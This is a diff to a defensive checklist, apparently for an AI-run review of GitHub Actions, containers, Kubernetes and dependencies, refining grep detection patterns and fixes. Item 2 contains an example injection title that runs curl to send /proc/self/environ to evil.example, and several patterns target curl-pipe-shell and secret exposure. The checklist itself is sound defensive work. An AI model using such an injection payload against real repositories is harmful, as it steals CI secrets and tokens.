@@ -23,11 +23,11 @@ installed (forms in the scanners file), then confirm each hit by reading the wor
 
 ### 1. Untrusted code with privileges (pwn request)
 
-- **`pull_request_target` or `workflow_run` never checks out and runs the PR's code.**
-  Evidence: `grep -rlE 'pull_request_target|workflow_run' .github/workflows`, then in each file
-  `grep -nE 'github[.]event[.]pull_request[.]head[.](sha|ref)|github[.]head_ref|workflow_run[.]head_(sha|branch)|refs/pull/' FILE`.
-  Read the job: a checkout of `github.event.pull_request.head.sha` or `.head.ref` followed by any build, install, test or script step
-  runs the fork's code. Attack path: anyone opens a fork PR that edits `package.json` scripts
+- **`pull_request_target`, `workflow_run` or `issue_comment` never checks out and runs the PR's code.**
+  Evidence: `grep -rlE 'pull_request_target|workflow_run|issue_comment' .github/workflows`, then in each file
+  `grep -nE 'github[.]event[.]pull_request[.]head[.](sha|ref)|github[.]head_ref|workflow_run[.]head_(sha|branch)|refs/pull/|pull/[^ /]+/head|g[h] pr checkout' FILE`.
+  Read the job: a checkout of `github.event.pull_request.head.sha` or `.head.ref`, a `gh pr checkout`
+  or a fetch of `pull/N/head`, followed by any build, install, test or script step, runs the fork's code. Attack path: anyone opens a fork PR that edits `package.json` scripts
   or a test; the job runs it with repo secrets and a write `GITHUB_TOKEN`. Fix: use
   `pull_request` for untrusted code; if `pull_request_target` is needed, check out the base
   only, or split into an unprivileged `pull_request` job and a `workflow_run` job that only
@@ -40,7 +40,8 @@ installed (forms in the scanners file), then confirm each hit by reading the wor
 ### 2. Script injection from event fields
 
 - **No untrusted `${{ github.event.* }}` inside `run:`.** Evidence:
-  `grep -rnE 'github[.]event[.](issue|pull_request|comment|review|review_comment|discussion|head_commit|commits|pages)[^ ]*[.](title|body|name|email|message|label|head_ref|ref)|github[.]head_ref' .github/workflows`.
+  `grep -rnE 'github[.]event[.](issue|pull_request|comment|review|review_comment|discussion|head_commit|commits|pages|workflow_run)[^ ]*[.](title|body|name|email|message|label|head_ref|head_branch|ref)|github[.]head_ref' .github/workflows`
+  (this also catches `workflow_run.head_branch`, `head_commit.message` and `pull_requests[*].head.ref`; a branch name can hold shell).
   Open each hit and see whether it sits in a `run:` block or an `actions/github-script`
   `script:` (injection) or in `env:` (safe). Attack path: anyone opens an issue or PR titled
   `a"; curl -d @/proc/self/environ https://evil.example; "` and the step runs it with the
@@ -67,7 +68,9 @@ installed (forms in the scanners file), then confirm each hit by reading the wor
 
 - **Top-level `permissions:` is set and narrow.** Evidence:
   `grep -rLE '^permissions:' .github/workflows` (files with no top-level block; they get the
-  repo default, often write-all) and `grep -rnE 'permissions: *write-all|: *write' .github/workflows`.
+  repo default: read for repos created since 2023, often write-all on older repos and orgs) and
+  `grep -rnE 'permissions: *write-all|: *write' .github/workflows`. After the `gh api` consent, the default:
+  `gh api repos/OWNER/REPO/actions/permissions/workflow`.
   Attack path: any injection or compromised action in that workflow gets a token that can push
   to the default branch, create releases or edit workflows. A finding needs a way in (items
   1 to 3); else "Worth hardening". Fix: `permissions: contents: read` at the top, and add
@@ -78,7 +81,7 @@ installed (forms in the scanners file), then confirm each hit by reading the wor
 
 ### 5. Secrets reachable from fork pull requests
 
-- **Secrets reach only trusted runs.** Evidence: `grep -rnE 'secrets[.]' .github/workflows`
+- **Secrets reach only trusted runs.** Evidence: `grep -rnE 'secrets[.]|secrets: *inherit|toJSON[(]secrets' .github/workflows`
   in workflows triggered by `pull_request_target`, `workflow_run` or `issue_comment`; and for
   private repos, whether "Send secrets to workflows from fork pull requests" is on (Settings,
   Actions; ask the user). Attack path: a fork PR reaches a step that has the secret and runs
@@ -91,19 +94,20 @@ installed (forms in the scanners file), then confirm each hit by reading the wor
 ### 6. Self-hosted runners on public repos
 
 - **Public repos use GitHub-hosted runners for PR jobs.** Evidence:
-  `grep -rnE 'runs-on:.*self-hosted' .github/workflows` and the repo visibility (consent ask,
-  or `gh api repos/OWNER/REPO --jq .visibility`). Attack path: anyone opens a fork PR that runs
+  `grep -rnE 'self-hosted|runs-on:' .github/workflows`, then read every `runs-on:` value (lists
+  over several lines, custom labels, `group:`) that does not start with `ubuntu-`, `windows-` or
+  `macos-`; and the repo visibility (consent ask, or `gh api repos/OWNER/REPO --jq .visibility`). Attack path: anyone opens a fork PR that runs
   on the self-hosted runner, keeps a process alive and reads later jobs' secrets or the
   network the runner sits on. Fix: GitHub-hosted runners for public repos, or ephemeral
-  runners with "Require approval for all outside collaborators".
+  runners with "Require approval for all external contributors".
 
 ### 7. Cloud OIDC trust
 
 - **The cloud role trusts one repo and branch only.** Look for a wildcard in
-  `token.actions.githubusercontent.com:sub`. Evidence (IaC):
-  `grep -rnE 'token[.]actions[.]githubusercontent[.]com:sub' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git --exclude-dir=node_modules .`,
-  then read the value: `repo:ORG/*`, `repo:ORG/REPO:*`, `StringLike` with `*`, or no `sub`
-  condition at all. Attack path: any branch, fork PR environment or other repo in the org
+  `token.actions.githubusercontent.com:sub`, or no `sub` condition at all. Evidence (IaC):
+  `grep -rnE 'token[.]actions[.]githubusercontent[.]com|repo:[^ "]*[*]' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git --exclude-dir=node_modules .`,
+  then read each trust: `repo:ORG/*`, `repo:ORG/REPO:*`, `StringLike` with `*`, a module input
+  such as `subjects = ["repo:ORG/*"]`, or only an `aud` condition and no `sub`. Attack path: any branch, fork PR environment or other repo in the org
   runs a workflow that assumes the deploy role. Fix: `StringEquals` on
   `repo:ORG/REPO:ref:refs/heads/main` or `repo:ORG/REPO:environment:production`. The live role
   in the account belongs to `aws-security-review` (its item 2.6); GCP workload identity and
@@ -151,9 +155,11 @@ reading every `Dockerfile*` and `Containerfile`.
 
 ### 12. Remote code at build time
 
-- **No `ADD` from a URL and no `curl | sh`.** Evidence: `grep -nE '^ADD +https?://' FILE`
-  and `grep -nE '(curl|wget)[^|]*[|] *(sudo +)?(ba|z)?sh' FILE` (also run the second on
-  `.github/workflows` with `-rn`). Attack path: whoever controls that URL or its DNS, or sits
+- **No `ADD` from a URL and no `curl | sh`.** Evidence: `grep -nE '^ADD +(--[^ ]+ +)*https?://' FILE`
+  (`ADD --chown=... https://` too) and
+  `grep -nwE '(curl|wget)[^|]*[|] *(sudo +(-[A-Za-z]+ +)*)?(ba|z)?sh|(ba|z)?sh +(-c +)?[^ ]*(curl|wget)' FILE`
+  (`| sudo -E bash`, `bash -c "$(curl ...)"`; `-w` skips `sha256sum`). Also run the second on
+  `.github/workflows` with `-rnwE`. Attack path: whoever controls that URL or its DNS, or sits
   on the path, runs code in the build, often with build secrets. Fix: download a pinned
   version, check `sha256sum -c`, then run it.
 
@@ -185,7 +191,7 @@ IaC, manifests or images are found (see SKILL.md). Read the files instead.
 - **RBAC is narrow.** Evidence: `cluster-admin` bindings, `verbs: ["*"]` or `resources: ["*"]`
   for app service accounts, `automountServiceAccountToken` left on. Attack path: a pod RCE
   uses the mounted token to read every Secret. Fix: one role per app with named verbs.
-- **No plain secrets in manifests.** Evidence: `grep -rlE '^kind: *Secret' --include='*.yaml' --include='*.yml' .`
+- **No plain secrets in manifests.** Evidence: `grep -rlxE 'kind: *Secret *' --include='*.yaml' --include='*.yml' .`
   (names only) with `data:` or `stringData:` committed. Fix: sealed or external secrets.
 - **Images are pinned.** `image:` with `latest` or no tag, as item 10.
 - The running cluster belongs to `infra-review`.
@@ -220,7 +226,8 @@ IaC, manifests or images are found (see SKILL.md). Read the files instead.
 - **Private package names cannot resolve on the public registry.** Evidence: scoped names in
   `package.json` (`@ORG/`) and `grep -oE '^@[a-z0-9-]+:registry' .npmrc` (scope only; the file
   can hold a token); `grep -rnE 'extra-index-url' --include='*.txt' --include='*.toml' --include='*.cfg' --include='*.ini' .`
-  for pip; Composer `repositories` without `canonical: true`. Attack path: an attacker
+  for pip; Composer `repositories` with `canonical: false` (Composer 2 makes them canonical by
+  default; Composer 1 never does). Attack path: an attacker
   publishes the private name on the public registry with a higher version; the build installs
   it (dependency confusion). Fix: a scope-to-registry line, `--index-url` instead of
   `--extra-index-url`, and claiming the names publicly.
@@ -228,13 +235,14 @@ IaC, manifests or images are found (see SKILL.md). Read the files instead.
 ### 18. Update bots and branch protection
 
 - **Dependabot or Renovate is set up, including for actions.** Evidence:
-  `ls .github/dependabot.yml renovate.json .github/renovate.json .renovaterc.json` and
-  `grep -n 'package-ecosystem' .github/dependabot.yml` (look for `github-actions` and
+  `ls .github/dependabot.yml .github/dependabot.yaml renovate.json renovate.json5 .github/renovate.json .github/renovate.json5 .renovaterc .renovaterc.json` and
+  `grep -n 'package-ecosystem' .github/dependabot.yml .github/dependabot.yaml` (look for `github-actions` and
   `docker`). No bot is "Worth hardening": pinned SHAs and images then go stale.
 - **The default branch has branch protection or a ruleset.** Evidence, only after consent:
   `gh api repos/OWNER/REPO/branches/BRANCH/protection` and `gh api repos/OWNER/REPO/rules/branches/BRANCH`.
   A 404 "Branch not protected" with no rules means unprotected. A 403 means the token is not
-  an admin: list the command for the human. Check required reviews, required status checks,
+  an admin: run `gh api repos/OWNER/REPO/branches/BRANCH --jq .protected` instead (true or
+  false, no detail) and list the protection command for the human. Check required reviews, required status checks,
   `enforce_admins`, force pushes and deletions off, and a `CODEOWNERS` entry for
   `.github/workflows/`. Attack path: one stolen contributor token, or one contributor, pushes
   to the default branch and the deploy workflow ships it with production secrets. Fix:
